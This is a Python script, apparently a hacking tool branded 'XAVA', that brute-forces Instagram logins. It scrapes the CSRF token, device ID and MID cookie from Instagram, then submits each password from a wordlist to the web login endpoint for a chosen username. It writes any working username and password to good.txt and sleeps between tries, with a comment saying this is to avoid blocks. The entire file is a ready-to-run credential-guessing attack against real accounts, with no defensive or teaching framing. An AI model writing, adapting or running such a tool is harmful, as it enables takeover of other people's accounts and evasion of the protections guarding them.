import requests
import re
import asyncio
import time
from aiohttp import ClientSession, ClientTimeout
import ssl
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cores
red_color = "\033[1;31m"
green_color = "\033[1;32m"
end_color = "\033[0m"
detect_color = "\033[1;34m"

# Banner
def Logo():
    print(detect_color + '''
        ██╗  ██╗ █████╗ ██╗   ██╗ █████╗
        ╚██╗██╔╝██╔══██╗██║   ██║██╔══██╗
         ╚███╔╝ ███████║██║   ██║███████║
         ██╔██╗ ██╔══██║╚██╗ ██╔╝██╔══██║
        ██╔╝ ██╗██║  ██║ ╚████╔╝ ██║  ██║
        ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝
        [ Dev: FaLaH | flaaah777@gmail.com ]
        [ Editing by Dr4ux0]
    ''' + end_color)


# Obter CSRF Token e Device ID
def GetCSRF_Token():
    headers = {
        'Host': 'www.instagram.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
    }

    response = requests.get('https://www.instagram.com/', headers=headers, verify=False)
    csrf_token = re.search(r'csrftoken=([a-zA-Z0-9\-_]+)', response.headers.get('Set-Cookie', ''))
    csrf_token_value = csrf_token.group(1) if csrf_token else None

    html_content = response.text
    device_id_match = re.search(r'"device_id":"([a-zA-Z0-9\-]+)"', html_content)
    device_id = device_id_match.group(1) if device_id_match else None

    return csrf_token_value, device_id


# Obter MID
def Get_MID(csrf_token_value):
    cookies = {'csrftoken': csrf_token_value}
    headers = {
        'Host': 'www.instagram.com',
        'X-CSRFToken': csrf_token_value,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
    }

    response = requests.get('https://www.instagram.com/api/v1/web/data/shared_data/', cookies=cookies, headers=headers, verify=False)
    mid = re.search(r'mid=([^;]+)', response.headers.get('Set-Cookie', ''))
    return mid.group(1) if mid else None


# Gerar senha com timestamp
def generate_enc_password(password):
    timestamp = int(time.time())
    return f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"


# Tentativa de login
async def attempt_login(session, username, password, csrf_token, device_id, mid):
    cookies = {
        'csrftoken': csrf_token,
        'mid': mid,
        'ig_did': device_id,
    }

    headers = {
        'Host': 'www.instagram.com',
        'X-CSRFToken': csrf_token,
        'X-IG-App-ID': '936619743392459',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }

    data = {
        'enc_password': generate_enc_password(password),
        'username': username,
        'queryParams': '{"next":"/login/","source":"desktop_nav"}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}',
    }

    async with session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                            cookies=cookies, headers=headers, data=data, ssl=False) as response:
        return await response.json()


# Execução principal
async def main():
    username = input("Username: ").strip()
    passwords_file = input("Password List File: ").strip()

    try:
        with open(passwords_file, 'r') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(red_color + "[!] Arquivo de senhas não encontrado." + end_color)
        return

    csrf_token, device_id = GetCSRF_Token()
    if not csrf_token or not device_id:
        print(red_color + "[!] Falha ao obter CSRF Token ou Device ID." + end_color)
        return

    mid = Get_MID(csrf_token)
    if not mid:
        print(red_color + "[!] Falha ao obter MID." + end_color)
        return

    timeout = ClientTimeout(total=30)
    async with ClientSession(timeout=timeout) as session:
        for password in passwords:
            try:
                result = await attempt_login(session, username, password, csrf_token, device_id, mid)
                if 'userId' in result or 'checkpoint_url' in result:
                    print(green_color + f"[+] Sucesso -> {username}:{password}" + end_color)
                    with open('good.txt', 'a') as file:
                        file.write(f"{username}:{password}\n")
                    return
                else:
                    print(red_color + f"[-] Falha -> {username}:{password}" + end_color)
            except Exception as e:
                print(red_color + f"[!] Erro durante a tentativa: {e}" + end_color)
            await asyncio.sleep(1)  # Delay para evitar bloqueios

if __name__ == "__main__":
    Logo()
    asyncio.run(main())
